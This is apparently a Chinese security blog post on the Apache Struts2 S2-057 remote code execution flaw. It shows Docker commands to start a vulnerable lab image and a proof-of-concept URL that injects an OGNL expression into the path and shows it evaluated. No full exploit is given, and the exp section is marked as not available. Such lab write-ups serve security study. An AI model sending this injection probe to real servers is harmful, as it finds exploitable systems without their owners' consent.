---
title: Struts2 远程代码执行漏洞(S2-057)
category: 
- 渗透测试
tags: 
- Pocsuite
- Docker

---

### 漏洞概述

- [影响版本](https://cwiki.apache.org/confluence/display/WW/S2-057)

### 漏洞环境搭建

- 拉取镜像到本地

```bash
$ docker pull medicean/vulapps:s_struts2_s2-057
```

- 启动环境

```bash
$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-057
#-p 80:8080 前面的 80 代表物理机的端口，可随意指定。
```

![image-20201126144119434](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201126144119434.png)

<!-- more -->

### 漏洞利用

- 访问 `http://你的 IP 地址:端口号/`

![image-20201126144223913](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201126144223913.png)

- Poc

```python
例如目标地址为：http://127.0.0.1:80/
访问 http://127.0.0.1:80/${(111+111)}/actionChain1.action

然后 URL 会变为 : http://127.0.0.1:80/222/register2.action, 其中 222 部分为 ognl 表达式 ${(111+111)} 执行结果。

Exp
```

- exp

暂无

- 利用过程

![bciwb-p8uqr](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020bciwb-p8uqr.gif)

### 参考链接

[references](https://xz.aliyun.com/t/2618)

<!-- more -->